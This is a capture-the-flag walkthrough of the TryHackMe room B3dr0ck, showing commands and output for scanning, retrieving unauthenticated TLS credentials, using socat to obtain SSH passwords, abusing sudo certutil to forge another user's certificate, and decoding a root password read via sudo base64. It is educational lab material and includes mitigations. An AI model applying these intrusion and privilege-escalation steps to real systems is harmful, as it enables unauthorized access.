---
title: "TryHackMe: B3dr0ck"
description: "Walkthrough of TryHackMe B3dr0ck - exploiting TLS certificate services to obtain credentials, using sudo certutil for lateral movement, and decoding multi-layered encoded passwords for root access."
date: 2025-12-26
categories: [TryHackMe]
tags: [ctf, tryhackme, easy, tls, certificates, socat, encoding, base64, base32, md5]
image:
  path: /assets/img/tryhackme/2025/b3dr0ck/cover.png
  alt: TryHackMe B3dr0ck Room
---

## Overview

| Property | Value |
|----------|-------|
| Room | [B3dr0ck](https://tryhackme.com/room/b3dr0ck) |
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| Attack Chain | `barney → fred → root` |

Server trouble in Bedrock! Barney is setting up the ABC webserver with **TLS certificates**. We exploited a **certificate service on port 9009** to retrieve client credentials, used them to connect to a **TLS-protected service on port 54321** which revealed SSH passwords. After gaining access as Barney, we used **sudo certutil** to generate new certificates for Fred, then escalated to root by decoding a **multi-layered encoded password** (base64 → base32 → base64 → MD5).

### Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Recon | nmap | Port scanning and service enumeration |
| Enum | netcat | Raw socket connection to certificate service |
| Exploit | socat | TLS socket connection with client certificates |
| Privesc | base64/base32 | Multi-layer password decoding |

---

## Reconnaissance

We begin with a comprehensive port scan to identify all running services.

```console
$ nmap -sC -sV -Pn -p- 10.82.167.139
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 22:16 EET
Nmap scan report for 10.82.167.139
Host is up (0.058s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.82.167.139:4040/
4040/tcp  open  ssl/yo-main?
| ssl-cert: Subject: commonName=localhost
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
```

Five ports are open:
- **Port 22**: OpenSSH - Standard SSH service
- **Port 80**: nginx - Redirects to port 4040
- **Port 4040**: Custom TLS webserver (ABC Broadcasting Company)
- **Port 9009**: Certificate retrieval service
- **Port 54321**: TLS-protected login/password hint service

> **Key Finding:** The service on port 9009 shows a "Welcome to ABC" banner and asks "What are you looking for?" - this is the certificate retrieval service mentioned in the room description.
{: .prompt-info }

---

## Enumeration

### Web Application (Port 4040)

The ABC Broadcasting Company website contains a hint from Barney:

![ABC Website](/tryhackme/2025/b3dr0ck/abc-website.jpg)
_ABC Broadcasting Company - Barney's message about the server setup_

The message mentions something "from the toilet and OVER 9000!" - a clear reference to port **9009**.

### Certificate Service (Port 9009)

Connecting to port 9009 with netcat reveals an interactive service:

```console
$ nc 10.82.167.139 9009

 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|

What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

The service provides instructions for connecting to port 54321 using TLS client certificates. Let's retrieve the certificate and key:

```console
What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
[...]
-----END CERTIFICATE-----

What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA79oDZL3Fr+ymVIv3Kx9PNhLIdiCRcox3fyNY42FUbUgs3vmR
[...]
-----END RSA PRIVATE KEY-----
```

> **Vulnerability Discovered:** The certificate service on port 9009 provides TLS credentials without any authentication. Anyone can retrieve Barney's certificate and private key.
{: .prompt-danger }

---

## Initial Access - Barney

### Connecting to TLS Service (Port 54321)

Save the certificate and key to files, then connect using socat:

```console
$ socat - ssl:10.82.167.139:54321,cert=barney.crt,key=barney.key,verify=0

 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> Password hint: [REDACTED] (user = 'Barney Rubble')
```

The service welcomes us as "Barney Rubble" and provides a password hint. Interestingly, the MD5 hash itself is the SSH password!

### SSH Access as Barney

```console
$ ssh barney@10.82.167.139
barney@10.82.167.139's password: [REDACTED]

barney@b3dr0ck:~$ cat barney.txt
THM{[REDACTED]}
```

> **Security Anti-Pattern:** Using an MD5 hash as a password doesn't provide any security benefit - it's just a long string that can be copied directly.
{: .prompt-warning }

---

## Lateral Movement - Fred

### Sudo Enumeration

Checking Barney's sudo privileges reveals an interesting capability:

```console
barney@b3dr0ck:~$ sudo -l
User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

Let's examine what certutil can do:

```console
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

### Generating Fred's Credentials

We can generate new TLS credentials for any user, including Fred:

```console
barney@b3dr0ck:~$ sudo /usr/bin/certutil fred 'Fred Flintstone'
Generating credentials for user: fred (Fred Flintstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
```

### Getting Fred's Password

Connect to port 54321 with Fred's newly generated credentials:

```console
$ socat - ssl:10.82.167.139:54321,cert=fred.crt,key=fred.key,verify=0

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck> Password hint: [REDACTED] (user = 'Fred Flintstone')
```

Fred's password is provided in plaintext.

### SSH Access as Fred

```console
$ ssh fred@10.82.167.139
fred@10.82.167.139's password: [REDACTED]

fred@b3dr0ck:~$ cat fred.txt
THM{[REDACTED]}
```

---

## Privilege Escalation - Root

### Sudo Enumeration

Fred has different sudo privileges:

```console
fred@b3dr0ck:~$ sudo -l
User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

Fred can read `/root/pass.txt` through base64 or base32 encoding. Let's decode it layer by layer.

### Multi-Layer Decoding

**Layer 1 - Read the file with base64:**

```console
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExO
SkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==
```

**Layer 2 - Decode base64, get base32:**

```console
$ echo "TEZLRU..." | base64 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

**Layer 3 - Decode base32, get another base64:**

```console
$ echo "LFKEC52Z..." | base32 -d
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
```

**Layer 4 - Decode base64, get MD5 hash:**

```console
$ echo "YTAwYTEy..." | base64 -d
[REDACTED]
```

**Layer 5 - Crack MD5 hash:**

Using [CrackStation](https://crackstation.net/), the MD5 hash cracks to the root password.

> **Encoding Chain:** The password went through: `plaintext → MD5 → base64 → base32 → base64`. This is security through obscurity, not actual security.
{: .prompt-info }

### Root Access

```console
$ ssh root@10.82.167.139
root@10.82.167.139's password: [REDACTED]

root@b3dr0ck:~# cat /root/root.txt
THM{[REDACTED]}
```

---

## Key Takeaways

### Vulnerabilities Exploited

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| Unauthenticated cert service | TLS credential disclosure | Require authentication for cert retrieval |
| Password exposed via TLS service | Direct SSH access | Never expose passwords through services |
| Overprivileged sudo (certutil) | Generate any user's certificates | Restrict certificate generation to admins |
| Readable encoded password file | Root access via decoding | Don't store passwords, even encoded |

### Security Anti-Patterns Observed

1. **Unauthenticated Certificate Service** - Port 9009 hands out TLS credentials to anyone who asks
2. **Password as Hash** - Using an MD5 hash as the actual password provides no security
3. **Plaintext Password Hints** - The TLS service on 54321 reveals passwords directly
4. **Overprivileged sudo** - Barney can generate certificates for any user
5. **Security Through Obscurity** - Multi-layer encoding is not encryption

### Skills Practiced

- TLS/SSL client certificate authentication
- Using socat for encrypted socket connections
- Multi-layer encoding/decoding (base64, base32)
- MD5 hash cracking with online databases
- Privilege escalation through misconfigured sudo rules
- Certificate-based authentication abuse

---

## References

- [socat - Multipurpose Relay](https://www.dest-unreach.org/socat/)
- [OpenSSL Certificate Commands](https://www.openssl.org/docs/man1.1.1/man1/)
- [CrackStation - Online Hash Cracking](https://crackstation.net/)
- [Base64 and Base32 Encoding](https://en.wikipedia.org/wiki/Base64)

